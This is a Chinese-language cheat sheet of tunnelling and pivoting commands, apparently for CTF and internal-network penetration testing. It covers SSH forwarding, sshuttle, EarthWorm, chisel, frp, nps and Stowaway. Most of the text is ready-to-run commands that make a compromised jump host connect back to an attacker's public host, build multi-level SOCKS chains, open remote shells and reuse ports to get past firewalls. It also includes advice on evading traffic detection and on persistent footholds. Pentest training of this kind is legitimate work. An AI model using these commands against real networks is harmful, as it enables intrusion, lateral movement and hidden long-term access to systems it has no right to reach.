# 隧道速查表

## 总览

## 快速选择

- 可出网：`frp`、`nps`。
- 只有 Web 入口：Neo-reGeorg。
- 需要 SOCKS：EarthWorm、Chisel。
- 已有 CS/MSF Session：`socks`、`autoroute`、`portfwd`。

## 标志说明

* **攻击机(Attacker)**：你自己的机器，有公网IP或至少能被跳板机连到
* **跳板机(Pivot)**：已拿下的第一层机器，通常双网卡，一边通外网/攻击机，一边通内网
* **内网目标机(Target)**：只有内网IP，攻击机无法直接访问，需要通过跳板机中转

典型拓扑：

```plain
攻击机(公网/可达) --- 跳板机(双网卡) --- 内网目标机(仅内网IP)
192.168.1.100(外) 192.168.1.1 / 10.0.0.1  10.0.0.2/24
```

判断原则：

* **正向连接**：跳板机能连回攻击机（跳板机在NAT后/防火墙内，主动发起连接）→ 用**反向隧道**
* **跳板机开放端口攻击机能直接连**→ 用**正向隧道**

***

## 1. SSH -D（动态端口转发 / SOCKS5代理）

只能做**正向**，需要攻击机能直接SSH到跳板机（或反向SSH建好通道后再用）。

### 正向：攻击机能SSH到跳板机

```plain
格式：ssh -D [本地监听端口] -N -f [跳板机用户名]@[跳板机IP]
```

```bash
# 攻击机执行
ssh -D 1080 -N -f user@跳板机IP
# 之后配合 proxychains 访问内网目标机
proxychains nmap -sT -Pn 10.0.0.2
```

### 反向场景：跳板机在NAT/防火墙后，只能主动连出

攻击机需要先开一个公网SSH服务，让跳板机反向连过来，再在攻击机本地做转发：

```plain
格式：ssh -R [攻击机上的映射端口]:[目标地址]:[目标端口] [攻击机用户名]@[攻击机IP]
```

```bash
# 跳板机执行（假设攻击机开了sshd，攻击机IP=1.1.1.1）
# 意思：把跳板机本地22端口，映射到攻击机的2222端口
ssh -R 2222:127.0.0.1:22 attacker_user@1.1.1.1

# 攻击机通过反向端口连回跳板机，再在跳板机上做本地SOCKS（相当于二次跳）
# 格式：ssh -p [刚才映射的端口] -D [本地监听端口] -N -f [连接地址，本地回环]
ssh -p 2222 -D 1080 -N -f 127.0.0.1
```

优点：无需额外工具，Linux自带。\
缺点：跳板机必须有ssh客户端/服务端，且需要跳板机上有落地权限开ssh。

## 2. sshuttle（基于SSH的透明VPN，一键把整个内网路由过来）

**只支持正向**（攻击机主动SSH跳板机），不支持反向。适合跳板机开着SSH且攻击机能直连的场景，比自己配proxychains省事很多。

```plain
格式：sshuttle -r [跳板机用户名]@[跳板机IP] [要路由的内网网段/掩码] -x [排除的地址]
```

```bash
# 攻击机执行，把10.0.0.0/24这个内网网段的流量都路由过跳板机
sshuttle -r user@跳板机IP 10.0.0.0/24 -x 跳板机IP

# 常用参数
sshuttle -r user@跳板机IP 10.0.0.0/24 --dns   # 顺带把DNS也转发
```

特点：不需要SOCKS配置，直接像在内网一样访问，`curl 10.0.0.2` 直接可用。\
限制：必须有跳板机的SSH账号密码/密钥，且跳板机能装python。

## 3. EarthWorm（ew）—— 国产轻量级隧道工具，专为多级内网设计

体积小、无需安装、跨平台，CTF/内网渗透最常用工具之一。核心是三种模式：`ssocksd`(正向SOCKS)、`rcsocks`(反向SOCKS)、`rssocks`+`lcx_slave/lcx_tran`(级联转发)。

### 场景A：正向 —— 跳板机能被攻击机直接访问

```plain
格式：ew -s ssocksd -l [跳板机本地监听端口]
```

```bash
# 跳板机（上传ew后执行），起一个SOCKS5代理
./ew -s ssocksd -l 1080

# 攻击机
proxychains nmap -sT 10.0.0.2   # proxychains配置里指向 跳板机IP:1080
```

### 场景B：反向 —— 跳板机在NAT后，只能主动连出，攻击机有公网IP

```plain
格式(攻击机)：ew -s rcsocks -l [攻击机本地SOCKS端口] -e [攻击机监听中转端口]
格式(跳板机)：ew -s rssocks -d [攻击机IP] -e [攻击机监听中转端口]
```

```bash
# 攻击机（公网1.1.1.1）先监听，等跳板机来连
./ew -s rcsocks -l 1080 -e 1234

# 跳板机主动连接攻击机
./ew -s rssocks -d 1.1.1.1 -e 1234

# 之后攻击机 proxychains 走本地1080端口即可访问内网
```

### 场景C：多级跳板（攻击机 <- 跳板机1 <- 跳板机2，跳板机1/2都只能主动连出），级联转发

```plain
格式(攻击机)：ew -s rcsocks -l [本地SOCKS端口] -e [等待跳板机1连入的端口]
格式(跳板机1/桥接层，两条命令一起跑)：
  ew -s lcx_slave -d [攻击机IP] -e [攻击机等待端口] -f 127.0.0.1 -g [桥接内部端口]
  ew -s lcx_listen -l [桥接内部端口] -e [等待跳板机2连入的端口]
格式(跳板机2/最深层)：ew -s rssocks -d [跳板机1的IP] -e [跳板机1等待连入的端口]
```

```bash
# 攻击机（公网1.1.1.1），起本地SOCKS并等待跳板机1接入
./ew -s rcsocks -l 1080 -e 8888

# 跳板机1（中间层，做级联转发桥接，两条命令都要跑）
./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 127.0.0.1 -g 9999
./ew -s lcx_listen -l 9999 -e 7777

# 跳板机2（最深层，只能连跳板机1）
./ew -s rssocks -d 跳板机1_IP -e 7777

# 数据流向：proxychains -> 攻击机1080 -> 8888 -> 9999 -> 7777 -> 跳板机2的rssocks
```

> 这是验证过的"二级级联反向SOCKS"组合：`rcsocks`(攻击机接1080) + `lcx_slave`+`lcx_listen`(跳板机1桥接) + `rssocks`(最深层反连)。`rssocks` 只能被 `rcsocks`/`lcx_listen` 接住，不要跟 `lcx_tran` 混用（`lcx_tran` 是纯正向端口转发，接不住反向连接）。

## 4. chisel（基于HTTP/WebSocket的隧道，防火墙穿透能力强，能过一些代理/CDN）

C/S架构：一端跑 `server`，一端跑 `client`，转发方向由client端参数决定（可以正向也可以反向）。

### 场景A：正向 —— 跳板机开server，攻击机做client去连

```plain
格式(跳板机)：chisel server -p [监听端口] --socks5
格式(攻击机)：chisel client [跳板机IP]:[跳板机监听端口] socks
```

```bash
# 跳板机（正向模式默认就是关闭reverse的，不用加--reverse；但要开--socks5才能让client用socks关键字）
chisel server -p 8000 --socks5

# 攻击机
chisel client 跳板机IP:8000 socks
# 本地默认1080端口变成SOCKS5代理，proxychains走它
```

### 场景B：反向（最常用，跳板机在内网NAT后）—— 攻击机开server，跳板机反连

```plain
格式(攻击机)：chisel server -p [监听端口] --reverse
格式(跳板机)：chisel client [攻击机IP]:[攻击机监听端口] R:[攻击机本地SOCKS端口]:socks
```

```bash
# 攻击机（公网），启动server并允许reverse
chisel server -p 8000 --reverse

# 跳板机，反向连回攻击机，同时在攻击机本地起1080 SOCKS
chisel client 攻击机IP:8000 R:1080:socks
# 局域网可访问的代理
chisel client 攻击机IP:8000 R:0.0.0.0:1080:socks
# R: 前缀表示reverse，让attacker本地1080变成通往内网的SOCKS5
```

优点：走HTTP/WS协议，容易绕过检测；支持TLS加密（`--tls`参数），比ew更隐蔽。\
适合出网只允许80/443的场景。

***

## 5. frp（Fast Reverse Proxy）—— 更重但功能最全，适合长期驻留/多端口/多服务转发

需要server端(frps)+client端(frpc)配置文件，比ew/chisel稍重，但支持TCP/UDP/HTTP代理、多路复用、加密压缩，适合搭建"据点"。

### 场景：跳板机在内网（NAT后），攻击机有公网IP，做反向内网穿透

```plain
格式(攻击机frps.ini)：
[common]
bind_port = [frp服务监听端口]
```

```properties
# 攻击机上 frps.ini
[common]
bind_port = 7000
```

```bash
./frps -c frps.ini
```

```plain
格式(跳板机frpc.ini)：
[common]
server_addr = [攻击机IP]
server_port = [攻击机frps监听端口]

[自定义名称]
type = tcp
remote_port = [映射到攻击机上的端口]
plugin = socks5
```

frp自带`plugin = socks5`插件，会在跳板机本地直接起一个SOCKS5服务并暴露到攻击机指定端口，不需要额外自己起socks服务，也不需要写local\_ip/local\_port：

```properties
# 跳板机上 frpc.ini —— 把跳板机的SOCKS5端口暴露到攻击机
[common]
server_addr = 攻击机IP
server_port = 7000

[socks5]
type = tcp
remote_port = 6000
plugin = socks5
```

```bash
./frpc -c frpc.ini
```

```bash
# 攻击机连自己的6000端口即为内网SOCKS5代理
proxychains nmap -sT 10.0.0.2   # proxychains指向 127.0.0.1:6000
```

### 场景：级联多层（跳板机2藏得更深）

在跳板机1上再起一个frps，跳板机2作为frpc连跳板机1，逐级转发，原理同ew的lcx级联，只是配置在ini文件里写多份。

优点：断线重连、多路复用、加密性好，适合持久化控制多个内网机器。\
缺点：需要预先写好配置文件，不如ew/chisel一条命令来得快，比赛中前期用ew/chisel应急，长期驻留用frp更稳。

***

## 6. nps（内网穿透管理工具，带Web管理面板，功能类似frp但更"傻瓜化"）

同样是C/S架构：服务端`nps`（一般跑在攻击机/公网服务器上，自带Web管理界面），客户端`npc`（跑在跳板机上，反向连接服务端）。适合需要图形化管理多个隧道、多个跳板机的场景，配置基本在Web面板上点出来，不用手写太多配置文件。

### 场景：跳板机在内网（NAT后），攻击机有公网IP，做反向内网穿透

```plain
格式(攻击机，启动服务端)：nps
（首次启动后访问 http://攻击机IP:8080 进入Web管理面板，默认端口8024用于客户端连接）
```

```bash
# 攻击机执行，启动nps服务端
./nps start
# 或前台调试
./nps
```

```plain
格式(跳板机，启动客户端反向连接)：npc -server=[攻击机IP]:[服务端通信端口] -vkey=[面板生成的密钥] -type=tcp
```

```bash
# 跳板机执行，vkey在攻击机Web面板"客户端管理"里生成
./npc -server=攻击机IP:8024 -vkey=abcd1234efgh5678 -type=tcp
```

在Web面板上为该客户端新增一条"隧道"，选择模式为 **socks5**，指定：

```plain
格式(面板配置项)：
客户端ID = [npc连接后自动注册的ID]
隧道模式 = socks5
服务端端口 = [攻击机上暴露的SOCKS5端口，例如1080]
```

配置完成、隧道启动后：

```bash
# 攻击机通过自己的1080端口访问内网
proxychains nmap -sT 10.0.0.2   # proxychains指向 127.0.0.1:1080
```

### 场景：多级/多跳板机集中管理

nps服务端支持同时接入多个npc客户端（多个跳板机），每个客户端在面板里对应独立的ID和隧道列表，适合比赛中同时拿下多台内网机器、需要统一在一个面板里管理所有隧道的情况，比frp多份ini文件更直观。

优点：Web面板可视化管理，支持多客户端、多隧道、流量统计，上手快；同时支持socks5/http代理、端口转发、P2P打洞等模式。\
缺点：需要提前部署Web面板，目标性更强、流量特征也更容易被识别（自带面板端口、默认banner等），隐蔽性不如chisel。

***

## 7. Stowaway（树状节点内网穿透工具，专攻多级内网场景）

同样是控制端(`admin`)+代理端(`agent`)结构，但核心亮点是**树状节点(Node)管理**：多级跳板可以逐级注册成父子关系，admin端能看到一整棵节点树，对任意深层节点直接下发指令，不用像ew那样每一跳手动搭一条lcx\_slave/lcx\_listen桥接链。此外节点间流量可选 TLS / AES-256-GCM 加密、上下游可用 HTTP/WS 伪装，隐蔽性比 chisel 更进一步。

### ⚠️ 二进制名（原笔记写错）

官方 release 产出的名字**带平台前缀**：`linux_x64_admin` / `linux_x64_agent`（Windows 是 `.exe`）。
README 里统一写作 **`./stowaway_admin` / `./stowaway_agent`**，部署时一般随手改名。
**不是 `./admin` / `./agent`。**

### 启动参数（常用）

| 参数 | 作用 |
| --- | --- |
| `-l <[ip]:port>` | **被动模式**：监听等待对方连入 |
| `-c <ip:port>` | **主动模式**：主动连过去 |
| `-s <密钥>` | 通信密钥，**所有节点（含 admin）必须一致** |
| `--tls-enable` | 节点间走 TLS。**启用后 AES 被禁用**，`-s` 仅用于节点间验证和端口复用；**所有节点都要开** |
| `--up` / `--down` | 上游 / 下游协议，可选 `tcp`(默认) / `http` / `ws`。**必须成对匹配** |
| `--reconnect <秒>` | agent 断线重连间隔（仅主动模式） |
| `--heartbeat` | **仅 admin**，持续向第一个节点发心跳，有反向代理时维持长连接 |
| `--domain <域名>` | TLS SNI / WebSocket 目标 Host（仅主动模式） |
| `--rehost` / `--report` | 端口复用（见下） |
| `--cs gbk` | Windows 中文平台解决 `shell` 乱码 |

### 场景A：正向 —— 跳板机能被攻击机直连

```bash
# 跳板机（被动模式，等待 admin 连入）
./stowaway_agent -l 0.0.0.0:1234 -s mypassword

# 攻击机（主动模式，直接连过去，节点自动加入 admin 的树）
./stowaway_admin -c 跳板机IP:1234 -s mypassword
```

### 场景B：反向 —— 跳板机在NAT后，只能主动连出

```bash
# 攻击机（被动模式，监听等待 agent 连入）
./stowaway_admin -l 2222 -s mypassword

# 跳板机反向连回攻击机（-c 即主动连接，本身就是反向穿透，无需额外标志）
./stowaway_agent -c 1.1.1.1:2222 -s mypassword
```

### 场景C：多级跳板（核心优势）

跳板机2主动连跳板机1，跳板机1再主动连攻击机；admin 端能看到一整棵树，对树上任意节点直接下发指令。

```bash
# 攻击机（监听）
./stowaway_admin -l 2222 -s pass1

# 跳板机1（第一层）主动连攻击机
./stowaway_agent -c 攻击机IP:2222 -s pass1

# —— 到 admin 控制台里让跳板机1开监听，才能接第二层 ——
(admin) >> use 0
(node 0) >> listen          # 选 1 (Normal passive)，端口填 1234

# 跳板机2（第二层，藏在跳板机1背后的内网）主动连跳板机1
./stowaway_agent -c 跳板机1_IP:1234 -s pass1
```

> PS：连不上跳板机1时，先看跳板机1防火墙开没开。

### ★ 控制台是两级面板（原笔记漏了，容易卡住）

admin 控制台**分两层**，命令不通用：

| 面板 | 提示符 | 独有命令 |
| --- | --- | --- |
| **主 panel** | `(admin) >>` | `use <id>`、`detail`、`topo` |
| **node panel** | `(node N) >>` | `socks`、`listen`、`forward`、`shell`、`upload` 等 |

**切节点必须先 `back` 回主 panel** —— node panel 里**没有 `use`**：

```bash
(admin) >> use 0            # 进入节点0
(node 0) >> socks 7777      # 在节点0上开 socks
(node 0) >> back            # ★ 先退回主 panel
(admin) >> use 1            # 才能切到节点1
(node 1) >> socks 7778
```

> ⚠️ 原笔记写的「`create` 一条新的转发规则」—— **Stowaway 没有 `create` 命令**（源码 25 条命令里没有）。
> 端口转发是 `forward <本地端口> <目标ip:port>`；反向是 `backward <远端端口> <本地端口>`。

**完整命令表（源码核对，25 条）**

主 panel：`use <id>` / `detail` / `topo` / `help` / `exit`

node panel：

| 命令 | 作用 |
| --- | --- |
| `status` | 看当前节点 socks/forward/backward 状态与活跃连接数 |
| `listen` | 当前节点开监听等子节点（Normal / IPTables Reuse / SOReuse） |
| `connect <ip:port>` | 当前节点**主动**连新节点 |
| `socks <端口> [user] [pass]` | 开 socks5 —— **监听在 admin 本地，出口在当前节点** |
| `stopsocks` | 关 socks |
| `forward <本地端口> <目标ip:port>` | 本地端口转发到远程 |
| `backward <远端端口> <本地端口>` | 远程端口反向转发到本地 |
| `ssh <ip:port>` | 经当前节点 SSH 到目标 |
| `shell` | 当前节点交互式 shell |
| `upload` / `download` | 上传 / 下载 |
| `addmemo <文字>` | **给节点加备注**（多级时必用，否则记不清哪台是哪台） |
| `shutdown` | 结束当前节点 |
| `back` | 回主 panel |

（另有 `stopforward` / `stopbackward` / `delmemo` / `help` / `exit`）

### ★ 关键：proxychains 只需要写一条

这是 Stowaway 和 gost / ew 最大的区别：

| | gost / ew | **Stowaway** |
| --- | --- | --- |
| 代理在哪 | 每跳各开 socks | **只在 admin 本地开一个 socks** |
| 出口在哪 | 就是那个跳板 | **`use` 选中哪个节点，出口就在哪个节点** |
| 级联谁做 | 你在 proxychains 里手动串 | **内部已做好** |
| proxychains 条数 | 多层 = 多条 | **一条** |

```ini
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 7777        # 改这一行 = 换出口层
```

**写两条会坏** —— proxychains 会「先连 7777、再经它去连 7778」，而 `127.0.0.1:7778` 是在**节点那台机器上**解析的，那儿没有监听 → 不通。

**推论**：**在最深的那个节点开 socks，一行就够覆盖所有层**（前提是该节点能路由到那些网段）。

> 端口号本身没含义，`7777`/`7778` 随便起；有意义的是**你在哪个节点上敲的 `socks`**。

### 端口复用（过防火墙）

两种方式，**在 agent 启动时定死**，控制台 `listen` 只是沿用：

**① SO_REUSEPORT / SO_REUSEADDR**（Win/Mac 主用，Linux 限制较多）

```bash
./stowaway_admin -c 192.168.0.105:80 -s 123
./stowaway_agent --report 80 --rehost 192.168.0.105 -s 123
# --rehost 不能是 0.0.0.0，填网卡外部地址
```

**② IPTABLES**（仅 Linux，**需 root**，agent 会自动改 iptables）

```bash
./stowaway_agent --report 22 -l 10000 -s 123
# 之后还要跑 script/ 目录下的 reuse.py，先把 SECRET 设成通信密钥
```

> Windows 下**不能复用 IIS / RDP 端口**，可复用 mysql、apache 之类。

### 反代场景（中间有 nginx 之类）

```bash
# admin（监听被代理后的 8000，对方访问 8080）
./stowaway_admin -l 8000 --tls-enable -s 123 --down ws --heartbeat
# agent
./stowaway_agent -c xxx.xxx.xxx.xxx:8080 --tls-enable -s 123 --domain xxx.com --up ws
```

### 坑清单

| 坑 | 处理 |
| --- | --- |
| 在 node panel 里敲 `use` 切节点 | 无效，**先 `back`** |
| `--up` / `--down` 不匹配 | 父节点设 `--down ws`，子节点必须 `--up ws`，否则直接断 |
| `--tls-enable` 漏开一个节点 | 连不上，**全网都要开** |
| 复用方式没在启动时设对 | 控制台选 SOReuse / IPTABLES 模式会失败 |
| admin 只能有 1 个直连 agent | 多级从第一个 agent 往下挂 |
| admin 不在线 | 新节点不允许加入 |
| `listen` 一次只接一个子节点 | 同层多个就执行多次 |
| Windows admin 控制台乱码 | 装 ansicon |

优点：多级内网场景下操作最简便，自带交互式命令行管理节点树；支持代理认证、TLS/AES 加密、端口复用。\
缺点：知名度不如ew/chisel/frp，部分比赛环境杀软/流量检测可能有特征库。

## 工具选型速查

| 场景 | 推荐工具 | 原因 |
| --- | --- | --- |
| 能直接SSH到跳板机 | ssh -D 或 sshuttle | 自带，无需上传文件 |
| 跳板机无ssh，但能被直连 | ew ssocksd / chisel正向 | 免安装，单文件 |
| 跳板机在NAT后，只能连出 | ew反向 / chisel反向(--reverse) | 一条命令建反连 |
| 出网只放行80/443，有WAF/检测 | chisel(可加--tls) | 走HTTP/WS，更隐蔽 |
| 多层内网(3层以上)级联 | ew级联(lcx\_slave+lcx\_listen) 或 Stowaway树状节点 | 专为级联设计 |
| 需要长期驻留、多端口多服务 | frp | 配置化管理，稳定性好 |
| 只是想临时看一眼内网 | sshuttle | 一条命令直接路由，不用配proxychains |
| 多机多隧道需要统一可视化管理 | nps | 自带Web面板，多客户端集中管理 |
| 深层多级内网(节点关系复杂) | Stowaway | 树状节点结构，逐级管理最省事 |
